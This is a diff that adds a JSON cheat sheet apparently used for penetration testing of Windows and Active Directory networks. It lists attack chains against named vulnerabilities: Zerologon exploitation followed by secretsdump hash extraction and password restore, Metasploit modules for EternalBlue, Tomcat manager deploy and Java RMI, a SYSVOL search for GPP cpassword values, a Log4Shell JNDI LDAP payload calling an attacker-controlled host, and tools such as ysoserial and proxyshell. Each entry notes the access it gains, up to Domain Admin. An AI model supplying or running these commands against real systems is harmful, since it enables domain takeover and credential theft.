@@ -1,0 +1,76 @@
+{
+  "Zerologon (CVE-2020-1472)": {
+    "description": "Unsafe authentication vulnerability",
+    "commands": {
+      "initial_scan": "zerologon-scan <dc-netbios_name>",
+      "exploitation_chain": [
+        {
+          "step1": "python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME>",
+          "step2": "secretsdump.py <DOMAIN>/<MACHINE_BIOS_NAME>@<IP>"
+        },
+        {
+          "step1": "secretsdump.py -hashes <HASH_admin> <DOMAIN>/Administrator@<IP>",
+          "step2": "python3 restorepassword.py -target-ip <IP> -DOMAIN/<MACHINE_BIOS_NAME>@<MACHINE_BIOS_NAME> -hexpass <HEXPASS>"
+        }
+      ]
+    },
+    "access_gained": ["Admin", "Domain Admin"]
+  },
+  "Eternal Blue (MS17-010)": {
+    "description": "SMB vulnerability",
+    "commands": {
+      "exploit": "exploit/windows/smb/ms17_010_eternalblue"
+    },
+    "access_gained": ["Admin", "Domain Admin"]
+  },
+  "SYSVOL & GPP (MS14-025)": {
+    "commands": [
+      "use scanner/smb/smb_enum_gpp",
+      "findstr /S /I cpassword \\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml"
+    ]
+  },
+  "Tomcat/JBoss Manager": {
+    "commands": [
+      "auxiliary/scanner/http/tomcat_enum",
+      "exploit/multi/http/tomcat_mgr_deploy"
+    ],
+    "access_gained": ["Admin", "Domain Admin", "Low Access"]
+  },
+  "Java RMI": {
+    "commands": {
+      "exploit": "exploit/multi/misc/java_rmi_server"
+    }
+  },
+  "Java Serialized Port": {
+    "commands": {
+      "tool": "ysoserial"
+    }
+  },
+  "Vulnerable Product with CVE": {
+    "commands": {
+      "tool": "searchsploit"
+    }
+  },
+  "Proxy Methods": {
+    "tools": [
+      "proxylogon",
+      "proxyshell"
+    ]
+  },
+  "Log4Shell": {
+    "commands": [
+      {
+        "chain": {
+          "step1": "${jndi:ldap://<ip>:<port>/a=reference}",
+          "step2": "rogue.jndi-1.0.jar"
+        }
+      }
+    ]
+  },
+  "Database Credentials": {
+    "commands": {
+      "mysql": "use admin/mssql/mssql_enum_sql_logins",
+      "leads_to": "MSSQL connection"
+    }
+  }
+}
